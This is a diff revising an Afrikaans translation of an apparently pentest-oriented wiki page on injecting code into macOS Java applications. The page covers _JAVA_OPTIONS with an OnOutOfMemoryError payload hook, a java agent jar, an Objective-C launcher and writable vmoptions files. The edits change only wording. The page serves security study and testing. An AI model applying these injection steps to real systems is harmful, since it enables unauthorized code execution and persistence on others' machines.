@@ -1,10 +1,10 @@
-# macOS Java Toepassings Inspuiting
+# macOS Java-toepassings-inspuiting
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Opname
+## Enumerasie
 
-Vind Java-toepassings wat op jou stelsel geïnstalleer is. Dit is opgemerk dat Java-toepassings in die **Info.plist** sekere java parameters sal bevat wat die string **`java.`** bevat, so jy kan daarna soek:
+Vind Java-toepassings wat op jou stelsel geïnstalleer is. Daar is opgemerk dat Java-toepassings in die **Info.plist** sommige Java-parameters sal bevat wat die string **`java.`** bevat, dus kan jy daarvoor soek:
 ```bash
 # Search only in /Applications folder
 sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
@@ -14,13 +14,13 @@ sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ```
 ## \_JAVA_OPTIONS
 
-Die omgewing veranderlike **`_JAVA_OPTIONS`** kan gebruik word om arbitrêre java parameters in die uitvoering van 'n java gecompileerde toepassing in te spuit:
+Die omgewingsveranderlike **`_JAVA_OPTIONS`** kan gebruik word om arbitrêre Java-parameters in die uitvoering van 'n Java-gekompileerde toepassing in te spuit:
 ```bash
 # Write your payload in a script called /tmp/payload.sh
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
 ```
-Om dit as 'n nuwe proses uit te voer en nie as 'n kind van die huidige terminal nie, kan jy gebruik maak van:
+Om dit as 'n nuwe proses uit te voer en nie as 'n child process van die huidige terminal nie, kan jy gebruik:
 ```objectivec
 #import <Foundation/Foundation.h>
 // clang -fobjc-arc -framework Foundation invoker.m -o invoker
@@ -73,7 +73,7 @@ NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary
 return 0;
 }
 ```
-egter, dit sal 'n fout op die uitgevoerde aansoek veroorsaak, 'n ander meer stealth manier is om 'n java-agent te skep en te gebruik:
+Dit sal egter 'n fout in die uitgevoerde toepassing veroorsaak; 'n meer stealthy manier is om 'n java agent te skep en die volgende te gebruik:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -83,7 +83,7 @@ export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
 > [!CAUTION]
-> Die skep van die agent met 'n **verskillende Java weergawe** van die toepassing kan die uitvoering van beide die agent en die toepassing laat crash
+> Die skep van die agent met ’n **ander Java-weergawe** as dié van die toepassing kan die uitvoering van beide die agent en die toepassing laat omval
 
 Waar die agent kan wees:
 ```java:Agent.java
@@ -102,7 +102,7 @@ err.printStackTrace();
 }
 }
 ```
-Om die agent te kompileer, voer in:
+Om die agent te compileer, voer uit:
 ```bash
 javac Agent.java # Create Agent.class
 jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
@@ -114,7 +114,7 @@ Agent-Class: Agent
 Can-Redefine-Classes: true
 Can-Retransform-Classes: true
 ```
-En dan voer die omgewing veranderlike uit en hardloop die java toepassing soos:
+En exporteer dan die env-veranderlike en hardloop die java-toepassing soos volg:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -125,12 +125,12 @@ open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Profession
 ```
 ## vmoptions-lêer
 
-Hierdie lêer ondersteun die spesifikasie van **Java params** wanneer Java uitgevoer word. Jy kan sommige van die vorige truuks gebruik om die java params te verander en **die proses in staat te stel om arbitrêre opdragte uit te voer**.\
-Boonop kan hierdie lêer ook **ander insluit** met die `include` gids, so jy kan ook 'n ingeslote lêer verander.
+Hierdie lêer ondersteun die spesifikasie van **Java params** wanneer Java uitgevoer word. Jy kan sommige van die vorige truuks gebruik om die java params te verander en **die proses arbitrêre opdragte te laat uitvoer**.\
+Boonop kan hierdie lêer ook **ander lêers insluit** met die `include`-gids, sodat jy ook ’n ingeslote lêer kan verander.
 
-Nog meer, sommige Java-apps sal **meer as een `vmoptions`** lêer **laai**.
+Verder sal sommige Java apps **meer as een `vmoptions`**-lêer laai.
 
-Sommige toepassings soos Android Studio dui in hul **uitset aan waar hulle soek** na hierdie lêers, soos:
+Sommige toepassings, soos Android Studio, dui in hul **output aan waar hulle na** hierdie lêers soek, soos:
 ```bash
 /Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions
 
@@ -141,7 +141,7 @@ Sommige toepassings soos Android Studio dui in hul **uitset aan waar hulle soek*
 2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 ```
-As hulle dit nie doen nie, kan jy dit maklik nagaan met:
+As hulle dit nie doen nie, kan jy dit maklik met die volgende nagaan:
 ```bash
 # Monitor
 sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
@@ -149,6 +149,6 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-Let op hoe interessant dit is dat Android Studio in hierdie voorbeeld probeer om die lêer **`/Applications/Android Studio.app.vmoptions`** te laai, 'n plek waar enige gebruiker van die **`admin` groep skryfrechten het.** 
+Let op hoe interessant dit is dat Android Studio in hierdie voorbeeld probeer om die lêer **`/Applications/Android Studio.app.vmoptions`** te laai, ’n plek waar enige gebruiker in die **`admin`-groep skryftoegang het.**
 
 {{#include ../../../banners/hacktricks-training.md}}
